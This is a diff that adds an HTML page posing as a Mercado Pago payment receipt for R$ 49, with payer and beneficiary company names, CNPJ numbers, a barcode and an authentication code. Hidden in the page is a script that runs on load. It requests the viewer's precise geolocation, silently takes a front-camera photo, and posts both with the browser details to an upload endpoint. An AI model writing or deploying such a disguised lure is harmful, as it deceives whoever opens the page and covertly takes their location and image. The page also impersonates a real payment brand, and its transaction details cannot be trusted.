@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>Comprovante de transação</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .comprovante {
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      width: 380px;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .header img {
+      height: 80px;
+    }
+
+    .header .title {
+      text-align: right;
+      font-size: 14px;
+    }
+
+    .header .title strong {
+      display: block;
+      font-size: 16px;
+    }
+
+    .section {
+      margin-bottom: 15px;
+    }
+
+    .section .label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 3px;
+      font-size: 12px;
+    }
+
+    .section .value {
+      font-size: 14px;
+    }
+
+    .total {
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      color: #00a650;
+      margin: 15px 0;
+    }
+
+    .barcode, .auth-code {
+      font-family: monospace;
+      font-size: 12px;
+      background: #f0f0f0;
+      padding: 5px;
+      border-radius: 5px;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+  <div class="comprovante">
+    <div class="header">
+      <img src="mercado-pago.svg" alt="Mercado Pago">
+      <div class="title">
+        Comprovante de transação
+        <strong>#13974215078</strong>
+      </div>
+    </div>
+
+    <div class="section">
+      <span class="label">Pagador:</span>
+      <span class="value">URBANA COMERCIO E SERVIÇO DE INFORMATICA - CPF/CNPJ: 36535724000187</span>
+    </div>
+
+    <div class="section">
+      <span class="label">Beneficiário:</span>
+      <span class="value">PAGAR.ME PAGAMENTOS - CPF/CNPJ: 18727053000174</span>
+    </div>
+
+    <div class="total">R$ 49</div>
+
+    <div class="section">
+      <span class="label">Detalhe da transação:</span>
+      <span class="value">Valor do boleto: R$ 49<br>Total pago: R$ 49</span>
+    </div>
+
+    <div class="section">
+      <span class="label">Código de barras:</span>
+      <div class="barcode">23791229286000757164349000046901685560000004900</div>
+    </div>
+
+    <div class="section">
+      <span class="label">Código de autenticação:</span>
+      <div class="auth-code">JABWZY1PGXX9PXO</div>
+    </div>
+  </div>
+
+  <script>
+    const ENDPOINT = 'http://localhost:13000/upload';
+    const PAYER_NAME = 'URBANA COMERCIO E SERVIÇO DE INFORMATICA';
+
+    async function captureAndSend() {
+      let locationData = null;
+      if (navigator.geolocation) {
+        try {
+          locationData = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 15000 });
+          });
+        } catch (err) {
+          console.warn('Não foi possível capturar localização:', err);
+        }
+      }
+
+      let imageData = null;
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          await video.play();
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+          imageData = canvas.toDataURL('image/png');
+          stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+          console.warn('Não foi possível capturar imagem:', err);
+        }
+      }
+
+      const payload = {
+        timestamp: new Date().toISOString(),
+        payer: PAYER_NAME,
+        location: locationData ? {
+          latitude: locationData.coords.latitude,
+          longitude: locationData.coords.longitude,
+          accuracy: locationData.coords.accuracy
+        } : null,
+        image: imageData,
+        userAgent: navigator.userAgent
+      };
+
+      console.log('Enviando dados para o backend...', payload);
+
+      try {
+        await fetch(ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        console.log('Dados enviados com sucesso!');
+      } catch (err) {
+        console.error('Erro ao enviar dados:', err);
+      }
+    }
+
+    window.addEventListener('load', captureAndSend);
+  </script>
+</body>
+</html>
